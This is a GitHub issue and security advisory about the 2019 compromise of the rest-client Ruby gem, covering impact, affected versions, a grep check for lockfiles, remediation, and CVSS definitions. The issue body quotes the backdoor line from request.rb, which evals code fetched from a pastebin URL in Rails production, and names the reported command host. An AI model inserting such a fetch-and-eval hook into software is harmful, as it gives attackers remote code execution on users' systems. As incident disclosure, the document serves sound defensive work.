## Description

![@juskoljo](https://avatars.githubusercontent.com/u/399362?u=941ecf3378deef5b3b3f605d8f6470c825e875e1&v=4&size=48)[juskoljo](https://github.com/juskoljo)opened [on Aug 19, 2019](https://github.com/rest-client/rest-client/issues/713#issue-482238151)
# Summary

On August 14, attackers published a series of rest-client versions from 1.6.10 to 1.6.13 using the credentials of a rest-client maintainer whose RubyGems.org account was compromised. The affected versions were downloaded a small number of times (~1000).

On August 19, [@juskoljo](https://github.com/juskoljo) observed the malicious gem version and created this issue. Later that day, the RubyGems security team yanked the offending gem version and locked the affected maintainer's

account. Several other gems were similarly affected.

<https://github.com/rubygems/rubygems.org/wiki/Gems-yanked-and-accounts-locked#19-aug-2019>

We have released version 1.6.14, identical to version 1.6.9, in order to supersede the affected versions in the legacy 1.6.x series. For checking dependencies, versions `<= 1.6.9` or `>= 1.6.14` are unaffected.

## Impact

The malicious backdoor in version 1.6.13 would activate in Rails installations where Rails.env started with "p" (as in "production"). It would then download code from a Pastebin.com URL and execute it. The pastebin is now gone, but it reportedly phoned home to execute instructions from `mironanoru.zzz.com.ua`, which has also disappeared. This was reportedly used to mine cryptocurrency, but could have been used for any purpose.

Most rest-client users were not affected because the 1.6.x series is very old and was superseded by 1.7.0 in 2014. Only users who pin to 1.6.x and updated to 1.6.13 in the last week could have been affected, and only then in Rails production environments.

To search for Gemfile.lock files containing one of the malicious

versions, you may find this grep command useful:

cd dir-to-search

grep --include='Gemfile.lock' -r . -e 'rest-client (1.6.1[0123])'

## Remediation

The rest-client maintainers will take a number of steps in response to this incident:

* First, we have released a new version 1.6.14 so that users who are for some reason unable to upgrade to a modern version of rest-client can have confidence in the security of a `bundle update`.
* Second, we will establish security practices that we expect of maintainers, such as enabling two-factor authentication on RubyGems.org accounts (available since last year).
* Third, we will seek to adopt policies for maintainer activity and continuity, and ideally seek one or two new active maintainers. The latest release prior to today was in 2017, so it is not a surprise that rest-client has several maintainers who have not been active in many years.

The RubyGems.org team is also in the process of making a number of upstream security improvements in response to the increasing prevalence of attacks targeting popular open source libraries. These include:

* Adding web UI to show which specific user pushed or yanked a given gem release.
* Adding email notifications to owners of new gem pushes. (currently disabled due to using a free email provider plan)
* Validating passwords against a list of known compromised passwords. (in progress)

Hi,

It seems that rest-client 1.6.13 is uploaded to rubygems.org. I did review between 1.6.9 and 1.6.13 and it seems that latest version evaluate remote code from pastebin.com and sends information to mironanoru.zzz.com.ua

request.rb:

```

  rescue Exception
  end
end

_!{Thread.new{loop{_!{sleep 900;eval(open('https://pastebin.com/raw/5iNdELNX').read)}}}if Rails.env[0]=="p"}
```

code from pastebin.com:

## Description

The rest-client gem 1.6.10 through 1.6.13 for Ruby, as distributed on RubyGems.org, included a code-execution backdoor inserted by a third party.

Users of an affected version should consider downgrading to the last non-affected version of 1.6.9, or upgrading to 1.7.x.

Additionally, a set of other minor gems have been partially or completely yanked and are included in this advisory.

These include cron\_parser, coin\_base, blockchain\_wallet, awesome-bot, doge-coin, capistrano-colors, bitcoin\_vanity, lita\_coin, coming-soon, and omniauth\_amazon.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
